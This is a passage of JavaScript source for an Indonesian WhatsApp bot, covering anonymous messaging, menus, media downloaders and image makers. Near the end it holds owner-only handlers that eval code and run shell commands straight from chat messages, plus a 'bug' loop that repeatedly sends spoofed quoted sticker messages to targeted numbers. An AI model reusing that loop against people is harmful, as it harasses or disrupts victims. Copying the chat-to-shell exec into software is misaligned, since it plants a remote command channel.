let luio = quoted.text.split("_______________________")[1].split("_______________________")[0]
let texl = `*Menfess Chat*

Balasan pesan dari @${m.chat.split("@")[0]}
Untuk pesan : 
___________________${luio}
____________________
Balasan: ${text}`
let hopi = quoted.contextInfo.mentionedJid[0]
if(text.length < 1) return m.reply("Masukkan pesan")
conn.sendMessage(hopi, {text: texl, mentions: [m.chat]})
}
break




case 'see': {
if(m.isGroup) return m.reply("Tidak bisa digunakan didalam grup")
let nom = text
let gms = quoted.text.split("_______________________")[1].split("_______________________")[0]
conn.sendMessage(nom, {text: `*Pesan Menfess*\n_______________________${gms}_______________________\n\nTelah dibaca oleh @${m.chat.split("@")[0]}`, mentions: [m.chat]})
}
break


 
case 'list2': case 'menu2': case 'help2':{
/*let btnz = [{buttonId: 'owner', buttonText: {displayText: 'Owner'}, type:1},{buttonId: 'profile', buttonText: {displayText: 'Profile'}, type:1},{buttonId: 'jebak', buttonText: {displayText: 'Aku\n'}, type:1}]*/
let buttono = [{buttonId: 'info', buttonText: {displayText: 'More Info'}, type:1}]
let btn = [{
urlButton: {
displayText: 'Channel',
url: 'https://youtube.com/channel/UCiA1c3DgEqjfCm5t6UwQ37w'
}
}, {
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/perwira_kusuma1'
}
}, {
quickReplyButton: {
displayText: 'Sewa',
id: 'sewa'
}
}, {
quickReplyButton: {
displayText: 'Owner',
id: 'owner'
}
},
{
quickReplyButton: {
displayText: 'Info Bot',
id: 'info'
}
}]

/*if (isAdmins) {
anu = `*List Menu*

*Group Menu*
≻ ${prefix}kick
≻ ${prefix}add
≻ ${prefix}promote
≻ ${prefix}demote
≻ ${prefix}group
≻ ${prefix}linkgc
≻ ${prefix}tagall
≻ ${prefix}hidetag
≻ ${prefix}sider
≻ ${prefix}setname
≻ ${prefix}setppgc

${themen}
`
await conn.sendButtonText2(m.chat, anu, `©Perwira Bot WhatsApp`, btn)
} else*/ 
if(m.isGroup) {
let anu = `*Group Menu*
≻ ${prefix}kick
≻ ${prefix}add
≻ ${prefix}promote
≻ ${prefix}demote
≻ ${prefix}group
≻ ${prefix}linkgc
≻ ${prefix}tagall
≻ ${prefix}hidetag
≻ ${prefix}totag
≻ ${prefix}setname
≻ ${prefix}setppgc

*Random Menu*
≻ ${prefix}wallpaper
≻ ${prefix}pinterest
≻ ${prefix}image

*Search Menu*
≻ ${prefix}play
≻ ${prefix}igstalk
≻ ${prefix}igstory
≻ ${prefix}google
≻ ${prefix}ringtone
≻ ${prefix}ytsearch
≻ ${prefix}wikipedia
≻ ${prefix}wikihow

*Sticker Menu*
≻ ${prefix}ttp
≻ ${prefix}attp
≻ ${prefix}sticker
≻ ${prefix}triggered
≻ ${prefix}emojimix

*Tools Menu*
≻ ${prefix}tts
≻ ${prefix}tourl
≻ ${prefix}convert
≻ ${prefix}translate
≻ ${prefix}download

*Maker Menu*
≻ ${prefix}anim
≻ ${prefix}textpro
≻ ${prefix}template
≻ ${prefix}styletext
________________

ᴸⁱᵗᵗˡᵉ ᴮᵒᵗ ᵂʰᵃᵗˢᴬᵖᵖ
*ᶜʳᵉᵃᵗᵉ ᵇʸ _ᴾᵉʳʷⁱʳᵃ ᴷᵘˢᵘᵐᵃ_*`
/*await conn.sendButGif(m.chat, anu, `©Perwira Bot WhatsApp`, fs.readFileSync('./image/gify.mp4'), btn)*/
/*conn.sendMessage(m.chat, 
{document: fs.readFileSync('./image/pem.jpg'), mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
fileName: '𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽', contextInfo: {
externalAdReply: {
sourceUrl: `https://©Perwira Bot WhatsApp `, 
mediaUrl: `https://©Perwira Bot WhatsApp `, 
mediaType: 1, renderLargerThumbnail: true,
thumbnail: fs.readFileSync(`./icon.jpeg`)}},
caption: anu,
footer: '*Multi~Device*\n*©Perwira Bot WhatsApp*',
buttons: buttono,
headerType:4})*/
/*conn.sendMessage(m.chat, {text: anu, contextInfo: {externalAdReply: {title: '©Perwira Bot Official', sourceUrl: `https://chat.whatsapp.com/ENwWtf0d5Mr3xc3TfJanNL`, mediaUrl: `https://chat.whatsapp.com/ENwWtf0d5Mr3xc3TfJanNL`, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./icon.jpeg`)}}})*/
/* conn.sendButtonText2(m.chat, anu, '©Perwira Bot WhatsApp\nThis is simple Bot WhatsApp', btn)*/
m.reply(anu)
} else if(!m.isGroup) {
let anu = `*Fun Menu*
≻ ${prefix}akinator

*Random Menu*
≻ ${prefix}wallpaper
≻ ${prefix}pinterest
≻ ${prefix}image

*Search Menu*
≻ ${prefix}play
≻ ${prefix}igstory
≻ ${prefix}google
≻ ${prefix}igstalk
≻ ${prefix}ringtone
≻ ${prefix}ytsearch
≻ ${prefix}wikipedia
≻ ${prefix}wikihow

*Sticker Menu*
≻ ${prefix}ttp
≻ ${prefix}attp
≻ ${prefix}sticker
≻ ${prefix}triggered
≻ ${prefix}emojimix

*Tools Menu*
≻ ${prefix}tts
≻ ${prefix}tourl
≻ ${prefix}convert
≻ ${prefix}translate
≻ ${prefix}download

*Maker Menu*
≻ ${prefix}anim
≻ ${prefix}textpro
≻ ${prefix}template
≻ ${prefix}styletext
________________

ᴸⁱᵗᵗˡᵉ ᴮᵒᵗ ᵂʰᵃᵗˢᴬᵖᵖ
*ᶜʳᵉᵃᵗᵉ ᵇʸ _ᴾᵉʳʷⁱʳᵃ ᴷᵘˢᵘᵐᵃ_*`
/*await conn.sendButGif(m.chat, anu, `©Perwira Bot WhatsApp`, fs.readFileSync('./image/gify.mp4'), btn)*/
/*conn.sendMessage(m.chat, 
{document: fs.readFileSync('./image/pem.jpg'), mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
fileName: '𝗦𝗶𝗺𝗽𝗹𝗲 𝗕𝗼𝘁 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽', contextInfo: {
externalAdReply: {
sourceUrl: `https://©Perwira Bot WhatsApp `, 
mediaUrl: `https://©Perwira Bot WhatsApp `, 
mediaType: 1, renderLargerThumbnail: true,
thumbnail: fs.readFileSync(`./icon.jpeg`)}},
caption: anu,
footer: '*Multi~Device*\n*©Perwira Bot WhatsApp*',
buttons: buttono,
headerType:4})*/
/* conn.sendMessage(m.chat, {text: anu, contextInfo: {externalAdReply: {title: '©Perwira Bot Official', sourceUrl: `https://chat.whatsapp.com/ENwWtf0d5Mr3xc3TfJanNL`, mediaUrl: `https://chat.whatsapp.com/ENwWtf0d5Mr3xc3TfJanNL`, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./icon.jpeg`)}}})*/
/*conn.sendButtonText2(m.chat, anu, '©Perwira Bot WhatsApp\nThis is simple Bot WhatsApp', btn)*/
m.reply(anu)
}
}break



case 'tiktokv2':{
if(!text.includes("tiktok.com")) return m.reply(`*Contoh yang benar*\n${prefix+command} https://vt.tiktok.com/ZSdrntSbF/`)
let {tiktokdlv3} = require("@bochilteam/scraper")
try {
await tiktokdlv3(text).then(async tikk => {
conn.sendMessage(m.chat, {video: {url: tikk.video.no_watermark}, caption: `*Tiktok downloader*`}, {quoted: m})
})
} catch(err) {
m.reply(util.format(err))
}
}
break



case 'fb':
case 'fbdl':
case 'facebook': {
if(text.length < 1) return m.reply(`Fitur untuk mendownload video Facebook

cara menggunakan
${prefix}fbdl https://www.facebook.com/groups/1066750060883536/permalink/1110133026545239/`)
try {
if(text.startsWith("@")) {
let meedia = await getBuffer(text.split("@")[1])
let { toAudio } = require('./lib/converter')
let audiio = await toAudio(meedia, 'mp4')
conn.sendMessage(m.chat, {document: audiio, ptt: false, mimetype: 'audio/mpeg', fileName: `Facebook Audio ${new Date() * 1}.mp3`, contextInfo: {mentionedJid: [quoted.sender], externalAdReply: {title: `Facebook audio Converter`, body: "©Perwira Bot WhatsApp", mediaUrl: text, sourceUrl: text, mediaType: 1, renderLargerThumbnail: true, showAdAttribution: true, thumbnail: fs.readFileSync('./image/fb.png')}}}) 
/*conn.sendMessage(m.chat, {document: audiio, mimetype: 'audio/mpeg', fileName: `Facebook Audio ${new Date() * 1}.mp3`}, { quoted : m })*/
} else if(text.includes("https://") && /facebook|fbl|permalink/.test(text)) {
await axios.post('https://ssyoutube.com/api/convert', `url=${text}`)
.then(({ data }) => {
(async () => {
let daa = await axios(data.url[0].url)
if(daa.headers["content-length"] > 20402526) return (async () => {templateButtones = [{index: 2, urlButton: {displayText: 'Download', url: data.url[0].url}}]; templateMessages = {viewOnceMessage :{message : { templateMessage : {hydratedTemplate: { hydratedContentText: "File melebihi 20 mb", hydratedFooterText: "©P-Bot 2022\nThis is Simple Bot WhatsApp", hydratedButtons: templateButtones}}}}}; conn.relayMessage(m.chat, templateMessages, {})})();
let dodi = [{ buttonId: `fb @${data.url[0].url}`, buttonText: { displayText: 'Audio' },type: 1}]
conn.sendButVidc(m.chat, dodi, "*Facebook Downloader*", '©P-Bot 2022\nThis is simple Bot WhatsApp', `${data.url[0].url}`)
})()
})
} else {
m.reply("*Masukkan Link dengan benar!*")
}
} catch(err) {
m.reply(String(err))
}
} break




case 'anim':{
if(!text.includes("/")) return m.reply(`Masukkan teks!
*Contoh :* ${prefix+command} gura/Text

*List Type Anim Maker*
gura
loli
loli2
neko
catboy
ghoul
hacker`)
let jeo = args.join(" ")
let jenis = jeo.split("/")[0]
let texts = jeo.split("/")[1]
let texts2 = jeo.split("/")[2]
var pathh = 'out.png'
if(jenis === 'ghoul') {
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gfx1()
.setName(texts)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'gura') {
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gura()
.setName(texts)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'loli') {
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gfx2()
.setName(texts)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'catboy') {
if(!text.includes("/")) return m.reply(`Masukkan teks!\n*Contoh :* ${prefix+command} ${jenis}/Perwira/Bot`)
if(texts2 === undefined) return m.reply(`Masukkan teks!\n*Contoh :* ${prefix+command} ${jenis}/Perwira/Bot`)
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gfx3()
.setText1(texts)
.setText2(texts2)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'neko') {
if(!text.includes("/")) return m.reply(`Masukkan teks!\n*Contoh :* ${prefix+command} ${jenis}/Perwira/Bot`)
if(texts2 === undefined) return m.reply(`Masukkan teks!\n*Contoh :* ${prefix+command} ${jenis}/Perwira/Bot`)
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gfx4()
.setText1(texts)
.setText2(texts2)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'loli2') {
haha = async () => {
var knights = require('./lib/knights-canvas')
var image = await new knights.Gfx5()
.setText(texts)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
haha().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else if(jenis === 'hacker') {
hacker = async () => {
var pathh = 'out2.png'
var knights = require("./lib/knights-canvas")
var image = await new knights.Hacker1()
.setText(texts)
.toAttachment();
data = image.toBuffer();
await fs.writeFileSync(pathh, data)
conn.sendMessage(m.chat, {image: {url: pathh}}, {quoted: m})
}
hacker().then(() => {
(async () => {
await fs.unlinkSync(pathh)
})()
})
} else {
m.reply(`Type *${args[0]}* tidak ada
*Contoh :* ${prefix}anim gura/Text

*List Type Anim Maker*
gura
loli
loli2
neko
catboy
ghoul
hacker`)
}
}
break


case 'get':{
if(!isCreator) return
if(text.length < 1) return m.reply(`Cara penggunaan\n*Contoh :* ${prefix+command} https://news.com`)
let mimeax = ''
try {
let res = await axios.head(q)
let mimeax = res.headers['content-type']
if (mimeax.split("/")[1] === "gif") {
return conn.sendMessage(m.chat, { video: await getBuffer(q), caption: caption, gifPlayback: true, mentions: men ? men : []}, {quoted: m})
} else if(mimeax.split("/")[0] === "image"){
return conn.sendMessage(m.chat, { image: await getBuffer(q)}, {quoted: m})
} else if(mimeax.split("/")[0] === "video"){
return conn.sendMessage(m.chat, { video: await getBuffer(q)}, {quoted: m})
} else if(mimeax.split("/")[0] === "audio"){
return conn.sendMessage(m.chat, { audio: await getBuffer(q), mimetype: 'audio/mpeg'}, {quoted: m })
} else if(mimeax.split("/")[1] === "vnd.android.package-archive"){
return conn.sendMessage(m.chat, { document: await getBuffer(q), mimetype: res.headers['content-type'], fileName: `Buffer apk ${new Date()} * 1}.apk`}, {quoted: m })
} else if(mimeax.split("/")[1] === "zip"){
return conn.sendMessage(m.chat, { document: await getBuffer(q), mimetype: res.headers['content-type'], fileName: `Buffer apk ${new Date()} * 1}.zip`}, {quoted: m })
} else { 
fetch(q).then((res) => res.text()).then((bu) => {
m.reply(bu)
})
}
} catch (e){
m.reply(e)
}
}break



/*case 'simi':{
m.reply(`Kirim pesan sambil reply chat yang dikirim oleh bot`)
}*/
/*let btnz = [{buttonId: 'simi off', buttonText: {displayText: 'Off'}, type:1},{buttonId: 'simi on', buttonText: {displayText: 'On'}, type:1}]
if (args.length < 1) return conn.sendButtonText(m.chat, btnz, `Pilih opsi dibawah untuk mengunakan`, `©Perwira Bot WhatsApp`)
if ((args[0]) === 'on') {
if (isSimi) return m.reply('_Fitur simi sudah aktif sebelum nya_')
simi.push(m.chat)
m.reply('_Sukses mengaktifkan mode simi di group ini_')
} else if ((args[0]) === 'off') {
simi.splice(m.chat, 1)
m.reply('_Sukses menonaktifkan mode simi di group ini_')
} else {
conn.sendButtonText(m.chat, btnz, `Pilih opsi dibawah untuk mengunakan`, `©Perwira Bot WhatsApp`)
}*/
/*break


*/
default:

if(m.isGroup) {
if (isBotAdmins) {
if (isAdmins) {
if(m.chat === "120363021644121771@g.us") {
if(budy.length > 5000) return conn.sendMessage(m.chat, {delete:m.key})
}
}
}
}

if(budy.includes("Assalamualaikum")) return m.reply("Waalaikumussalam")

if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return m.reply(bang)
}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))
}
}


if (budy.startsWith('>')) {
if (!isCreator) return 
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}

if (budy.startsWith('x')){
if (!isCreator) return 
return conn.sendMessage(m.chat, {text: JSON.stringify(eval(budy.slice(2)),null,'\t')},{quoted: m}).catch(err => m.reply(util.format(err)))
}

if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)
})
}

if(isCmd) {
if(command.length < 4) return
m.reply(`*${prefix+command}* tidak ada di Menu!`)
}


if(bug.status) {
if (new Date() * 1 - bug.time > 8000) {
if(bug.nobug === 0) return conn.sendMessage("120363021942310633@g.us", {text: "Tidak ada target di bug, pesan otomatis setiap 8 detik"})
for(let song of bug.nobug) {
await conn.sendMessage(song, {text: 'hhh'}, {quoted: {
"key": {
"remoteJid": "0@g.us",
"fromMe": false,
"id": "14A30F55FB9C76CF140E877C4D6D128E"
},
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AunY7yHh6EkqM1sDDMIJ2qORAKlCdes3B-d7swgDv2Kt.enc",
"fileSha256": "uQg4HDVaMzzg1v1wHmfAWjWRkKG9GNT5c2SZTRXovgc=",
"fileEncSha256": "wij8hlNGvs6mwUEcU2fX8fhy3VRf0tWG+0vEuVyErj8=",
"mediaKey": "lR3sZLrbOpDuhUnog4l0R6Jvu+IDmmhezztNzbIPKr8=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.15575-24/11295129_615209830120770_4992314152979842429_n.enc?ccb=11-4&oh=01_AVwBdGYmOiGAURqtXn08f-prSfQ5KZ8NOEPov5PfpMeM1w&oe=63391242",
"fileLength": "67400",
"mediaKeyTimestamp": "1662122597",
"isAnimated": false
}
},
"participant": "0@s.whatsapp.net"
}})
}
bug.time = new Date() * 1
fs.writeFileSync('./bug.json', JSON.stringify(bug))
}
}
}
} catch(err) {
m.reply(`*Attention*\n${String(err)}\n${err}`)
conn.sendMessage(m.chat, {text:`*Attention*\n${String(err)}`})

}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
